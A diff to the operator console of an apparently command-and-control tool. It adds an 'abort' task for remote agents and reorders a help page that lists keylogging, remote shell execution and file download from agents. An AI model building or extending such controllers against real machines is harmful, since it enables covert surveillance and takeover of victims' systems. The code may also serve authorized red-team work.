@@ -55,16 +55,17 @@ export const setupWS = (httpServer) => {
     // Console help page.
     const helpPage = "  COMMAND                FUNCTION\n"+
                      "  -------                --------\n\n"+
+                     "  abort                  Task agent to quit\n"+
                      "  clear                  Clear console output\n"+
                      "  delete agent           Delete agent\n"+
                      "  delete task <id>       Delete a task\n"+
                      "  download <file>        Download a file from the agent\n"+
                      "  freeze                 Freeze/stop agent from receiving tasks\n"+
+                     "  help/?                 You are looking at it :p\n"+
                      "  unfreeze               Unfreeze agent\n"+
                      "  keymon <secs>          Run a keylogger for given amount of seconds\n"+
                      "  system <cmd>           Run a shell command on the agent\n"+
-                     "  writedir <dir>         Change the write directory of an agent\n"+
-                     "  help/?                 Print this help page\n";
+                     "  writedir <dir>         Change the write directory of an agent\n";
 
     /**
      * For processing raw agent console inputs from users. 
@@ -136,6 +137,12 @@ export const setupWS = (httpServer) => {
           let duration = parseInt(input.substr(7).trim());
           taskModel.createTask(username, {
             agentID, taskType: "keymon", data: {duration}
+          }).catch(error => {
+            socketServer.emit("striker_error", error.message);
+          });
+        }else if (input === "abort"){
+          taskModel.createTask(username, {
+            agentID, taskType: "abort"
           }).catch(error => {
             socketServer.emit("striker_error", error.message);
           });
